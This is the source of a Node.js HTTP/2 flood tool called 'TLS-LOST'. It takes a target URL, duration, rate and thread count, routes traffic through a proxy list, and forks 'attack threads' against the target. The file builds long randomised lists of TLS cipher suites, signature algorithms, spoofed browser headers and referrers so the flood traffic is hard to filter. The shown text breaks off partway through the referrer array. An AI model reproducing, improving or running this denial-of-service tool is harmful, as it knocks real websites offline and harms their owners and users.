const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
var path = require("path");
const crypto = require("crypto");
const UserAgent = require('user-agents');
const fs = require('fs');
const {
  HeaderGenerator
} = require('header-generator');
const axios = require('axios');
const https = require("https");
process.setMaxListeners(0x0);
require('events').EventEmitter.defaultMaxListeners = 0x0;
process.on("uncaughtException", function (_0x533609) {});
if (process.argv.length < 0x6) {
  console.log("node TLS-LOST [URL] [TIME] [REQ] [THREAD]");
  process.exit();
}
const headers = {};
function readLines(_0x593f8f) {
  return fs.readFileSync(_0x593f8f, "utf-8").toString().split(/\r?\n/);
}
const targetURL = process.argv[0x2];
const agent = new https.Agent({
  'rejectUnauthorized': false
});
function getStatus() {
  const _0xe295ea = new Promise((_0x2f38b0, _0x9ea7e4) => {
    setTimeout(() => {
      _0x9ea7e4(new Error("Request timed out"));
    }, 0x1388);
  });
  const _0x542250 = axios.get(targetURL, {
    'httpsAgent': agent
  });
  Promise.race([_0x542250, _0xe295ea]).then(_0x1fc394 => {
    const {
      status: _0x545140,
      data: _0x4b669f
    } = _0x1fc394;
    console.log("[[94mSystem[0m] " + getTitleFromHTML(_0x4b669f) + " ([32m" + _0x545140 + "[0m)");
  })['catch'](_0x37b684 => {
    if (_0x37b684.message === "Request timed out") {
      console.log("[[94mSystem[0m] [91mRequest Timed Out[0m");
    } else {
      if (_0x37b684.response) {
        const _0xa42e4 = getTitleFromHTML(_0x37b684.response.data);
        console.log("[[94mSystem[0m] Status " + _0xa42e4 + " ([31m" + _0x37b684.response.status + "[0m)");
      } else {
        console.log("[[94mSystem[0m] [91m" + _0x37b684.message + "[0m");
      }
    }
  });
}
function getTitleFromHTML(_0x16db1e) {
  const _0x411e17 = _0x16db1e.match(/<title>(.*?)<\/title>/i);
  if (_0x411e17 && _0x411e17[0x1]) {
    return _0x411e17[0x1];
  }
  return "Not Found";
}
function randomIntn(_0x31dc84, _0x3b9267) {
  return Math.floor(Math.random() * (_0x3b9267 - _0x31dc84) + _0x31dc84);
}
function getRandomNumberBetween(_0x22a126, _0x3052c9) {
  return Math.floor(Math.random() * (_0x3052c9 - _0x22a126 + 0x1) + _0x22a126);
}
function randomString(_0x3a97c2) {
  var _0x5e9148 = '';
  var _0xbcf0c9 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".length;
  for (var _0x59bed5 = 0x0; _0x59bed5 < _0x3a97c2; _0x59bed5++) {
    _0x5e9148 += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(Math.random() * _0xbcf0c9));
  }
  ;
  return _0x5e9148;
}
function randomElement(_0x91140) {
  return _0x91140[Math.floor(Math.random() * (_0x91140.length - 0x0) + 0x0)];
}
const args = {
  'target': process.argv[0x2],
  'time': ~~process.argv[0x3],
  'Rate': ~~process.argv[0x4],
  'threads': ~~process.argv[0x5]
};
try {
  var proxyFile = fs.readFileSync("proxy.txt", "utf-8").toString().replace(/\r/g, '').split("\n");
} catch (_0x1e05cd) {
  console.log("Proxy file no found, \"proxy.txt\".");
  process.exit();
}
if (cluster.isMaster) {
  console.clear();
  console.log("[37m\n▀▀█▀▀ ░█─── ░█▀▀▀█ ── ░█─── ░█▀▀▀█ ░█▀▀▀█ ▀▀█▀▀ \n─░█── ░█─── ─▀▀▀▄▄ ▀▀ ░█─── ░█──░█ ─▀▀▀▄▄ ─░█── \n─░█── ░█▄▄█ ░█▄▄▄█ ── ░█▄▄█ ░█▄▄▄█ ░█▄▄▄█ ─░█──\n[0m");
  console.log("[95mCode by Jxdn[0m");
  for (let i = 0x1; i <= process.argv[0x5]; i++) {
    cluster.fork();
    console.log("[[94mSystem[0m] Attack Thread " + i + " Started");
  }
  console.log("[[94mSystem[0m] Attack Launching to " + process.argv[0x2]);
  setInterval(getStatus, 0x7d0);
  setTimeout(() => {
    console.log("[[95mSystem[0m] The Attack Is Over");
    process.exit(0x1);
  }, process.argv[0x3] * 0x3e8);
}
let headerGenerator = new HeaderGenerator({
  'browsers': [{
    'name': "firefox",
    'minVersion': 0x70,
    'httpVersion': '2'
  }, {
    'name': "opera",
    'minVersion': 0x70,
    'httpVersion': '2'
  }, {
    'name': "edge",
    'minVersion': 0x70,
    'httpVersion': '2'
  }, {
    'name': 'chrome',
    'minVersion': 0x70,
    'httpVersion': '2'
  }, {
    'name': "safari",
    'minVersion': 0x10,
    'httpVersion': '2'
  }],
  'devices': ["desktop", "mobile"],
  'operatingSystems': ['windows', "linux", "macos", 'android', 'ios'],
  'locales': ["en-US", 'en']
});
let randomHeaders = headerGenerator.getHeaders();
const cplist = ['RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM', "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", 'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA', "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH', "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL", "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5", "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS", 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK', "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK", 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH', "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5', "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS", "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK", 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM', 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM', "ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA", "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH', "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL", "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5", "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS", 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK', "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK", 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH', "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5", "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS", "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK", "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA", ":ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK", "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"];
const hihi = ["require-corp", "unsafe-none"];
const sigalgs = ['ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512', "ecdsa_brainpoolP256r1tls13_sha256", "ecdsa_brainpoolP384r1tls13_sha384", 'ecdsa_brainpoolP512r1tls13_sha512', "ecdsa_sha1", "ed25519", 'ed448', "ecdsa_sha224", "rsa_pkcs1_sha1", 'rsa_pss_pss_sha256', "dsa_sha256", "dsa_sha384", "dsa_sha512", "dsa_sha224", 'dsa_sha1', 'rsa_pss_pss_sha384', "rsa_pkcs1_sha2240", "rsa_pss_pss_sha512", "sm2sig_sm3", "ecdsa_secp521r1_sha512"];
lang_header = ['ko-KR', "en-US", "zh-CN", "zh-TW", "ja-JP", 'en-GB', "en-AU", "en-GB,en-US;q=0.9,en;q=0.8", "en-GB,en;q=0.5", "en-CA", "en-UK, en, de;q=0.5", "en-NZ", 'en-GB,en;q=0.6', "en-ZA", "en-IN", "en-PH", "en-SG", "en-HK", "en-GB,en;q=0.8", "en-GB,en;q=0.9", " en-GB,en;q=0.7", '*', "en-US,en;q=0.5", "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5", "utf-8, iso-8859-1;q=0.5, *;q=0.1", "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", "en-GB, en-US, en;q=0.9", "de-AT, de-DE;q=0.9, en;q=0.5", "cs;q=0.5", "da, en-gb;q=0.8, en;q=0.7", "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", "en-US,en;q=0.9", 'de-CH;q=0.7', 'tr', "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"];
accept_header = ["application/json", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9", "text/html; charset=utf-8", "application/json, text/plain, */*", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"];
encoding_header = ["gzip, deflate, br", "compress, gzip", "deflate, gzip", "gzip, identity", '*'];
controle_header = ["no-cache", "no-store", "no-transform", 'only-if-cached', 'max-age=0', 'must-revalidate', "public", "private", "proxy-revalidate", "s-maxage=86400"];
encoding_header = ['*', "*/*", "gzip", "gzip, deflate, br", "compress, gzip", "deflate, gzip", "gzip, identity", "gzip, deflate", 'br', "br;q=1.0, gzip;q=0.8, *;q=0.1", "gzip;q=1.0, identity; q=0.5, *;q=0", "gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25", "compress;q=0.5, gzip;q=1.0", 'identity', "gzip, compress", "compress, deflate", "compress", "gzip, deflate, br", "deflate", "gzip, deflate, lzma, sdch", "deflate"];
controle_header = ["max-age=604800", 'proxy-revalidate', "public, max-age=0", "max-age=315360000", "public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800", "s-maxage=604800", "max-stale", "public, immutable, max-age=31536000", "must-revalidate", "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0", "max-age=31536000,public,immutable", "max-age=31536000,public", "min-fresh", "private", "public", "s-maxage", "no-cache", "no-cache, no-transform", "max-age=2592000", "no-store", 'no-transform', "max-age=31557600", "stale-if-error", 'only-if-cached', 'max-age=0', "must-understand, no-store", "max-age=31536000; includeSubDomains", "max-age=31536000; includeSubDomains; preload", "max-age=120", "max-age=0,no-cache,no-store,must-revalidate", "public, max-age=604800, immutable", "max-age=0, must-revalidate, private", "max-age=0, private, must-revalidate", "max-age=604800, stale-while-revalidate=86400", "max-stale=3600", "public, max-age=2678400", "min-fresh=600", "public, max-age=30672000", "max-age=31536000, immutable", "max-age=604800, stale-if-error=86400", "public, max-age=604800", "no-cache, no-store,private, max-age=0, must-revalidate", "o-cache, no-store, must-revalidate, pre-check=0, post-check=0", "public, s-maxage=600, max-age=60", "public, max-age=31536000", "max-age=14400, public", "max-age=14400", "max-age=600, private", "public, s-maxage=600, max-age=60", "no-store, no-cache, must-revalidate", "no-cache, no-store,private, s-maxage=604800, must-revalidate", 'Sec-CH-UA,Sec-CH-UA-Arch,Sec-CH-UA-Bitness,Sec-CH-UA-Full-Version-List,Sec-CH-UA-Mobile,Sec-CH-UA-Model,Sec-CH-UA-Platform,Sec-CH-UA-Platform-Version,Sec-CH-UA-WoW64'];
const Methods = ["GET", "HEAD", "POST", "PUT", "DELETE", 'CONNECT', "OPTIONS", "TRACE", "PATCH"];
const randomMethod = Methods[Math.floor(Math.random() * Methods.length)];
const queryStrings = ['&', '='];
const pathts = ["?page=1", "?page=2", '?page=3', '?category=news', '?category=sports', "?category=technology", '?category=entertainment', "?sort=newest", '?filter=popular', '?limit=10', "?start_date=1989-06-04", '?end_date=1989-06-04'];
const refers = ["https://www.google.com/search?q=", 'https://check-host.net/', "https://www.facebook.com/", "https://www.youtube.com/", "https://www.fbi.com/", "https://www.bing.com/search?q=", "https://r.search.yahoo.com/", 'https://www.cia.gov/index.html', "https://vk.com/profile.php?redirect=", "https://www.usatoday.com/search/results?q=", 'https://help.baidu.com/searchResult?keywords=', "https://steamcommunity.com/market/search?q=", "https://www.ted.com/search?q=", "https://play.google.com/store/search?q=", "https://www.qwant.com/search?q=", 'https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=', 'https://www.google.ad/search?q=', "https://www.google.ae/search?q=", "https://www.google.com.af/search?q=", 'https://www.google.com.ag/search?q=', "https://www.google.com.ai/search?q=", "https://www.google.al/search?q=", "https://www.google.am/search?q=", 'https://www.google.co.ao/search?q=', "http://anonymouse.org/cgi-bin/anon-www.cgi/", "http://coccoc.com/search#query=", "http://ddosvn.somee.com/f5.php?v=", 'http://engadget.search.aol.com/search?q=', 'http://engadget.search.aol.com/search?q=query?=query=&q=', 'http://eu.battle.net/wow/en/search?q=', 'http://filehippo.com/search?q=', "http://funnymama.com/search?q=", "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=", "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/", "http://go.mail.ru/search?mail.ru=1&q=", 'http://help.baidu.com/searchResult?keywords=', "http://host-tracker.com/check_page/?furl=", "http://itch.io/search?q=", "http://jigsaw.w3.org/css-validator/validator?uri=", 'http://jobs.bloomberg.com/search?q=', 'http://jobs.leidos.com/search?q=', "http://jobs.rbs.com/jobs/search?q=", "http://king-hrdevil.rhcloud.com/f5ddos3.html?v=", 'http://louis-ddosvn.rhcloud.com/f5.html?v=', "http://millercenter.org/search?q=", "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=", "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/", 'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=', "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/", "http://page-xirusteam.rhcloud.com/f5ddos3.html?v=", 'http://php-hrdevil.rhcloud.com/f5ddos3.html?v=', "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=", "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x/", "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf&q=", "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf/", 'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=', 'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/', "http://search.aol.com/aol/search?q=", "http://taginfo.openstreetmap.org/search?q=", "http://techtv.mit.edu/search?q=", "http://validator.w3.org/feed/check.cgi?url=", 'http://vk.com/profile.php?redirect=', 'http://www.ask.com/web?q=', "http://www.baoxaydung.com.vn/news/vn/search&q=", 'http://www.bestbuytheater.com/events/search?q=', "http://www.bing.com/search?q=", "http://www.evidence.nhs.uk/search?q=", "http://www.google.com/?q=", "http://www.google.com/translate?u=", 'http://www.google.ru/url?sa=t&rct=?j&q=&e&q=', 'http://www.google.ru/url?sa=t&rct=?j&q=&e/', "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=", 'http://www.pagescoring.com/website-speed-test/?url=', "http://www.reddit.com/search?q=", "http://www.search.com/search?q=", "http://www.shodanhq.com/search?q=", "http://www.ted.com/search?q=", "http://www.topsiteminecraft.com/site/pinterest.com/search?q=", "http://www.usatoday.com/search/results?q=", "http://www.ustream.tv/search?q=", 'http://yandex.ru/yandsearch?text=', 'http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=', "http://ytmnd.com/search?q=", 'https://add.my.yahoo.com/rss?url=', "https://careers.carolinashealthcare.org/search?q=", "https://check-host.net/", "https://developers.google.com/speed/pagespeed/insights/?url=", "https://drive.google.com/viewerng/viewer?url=", 'https://duckduckgo.com/?q=', "https://google.com/", "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=", 'https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=', "https://help.baidu.com/searchResult?keywords=", "https://play.google.com/store/search?q=", 'https://pornhub.com/', "https://r.search.yahoo.com/", 'https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=', "https://steamcommunity.com/market/search?q=", "https://vk.com/profile.php?redirect=", "https://www.bing.com/search?q=", "https://www.cia.gov/index.html", "https://www.facebook.com/", "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=", 'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=', "https://www.fbi.com/", "https://www.google.ad/search?q=", 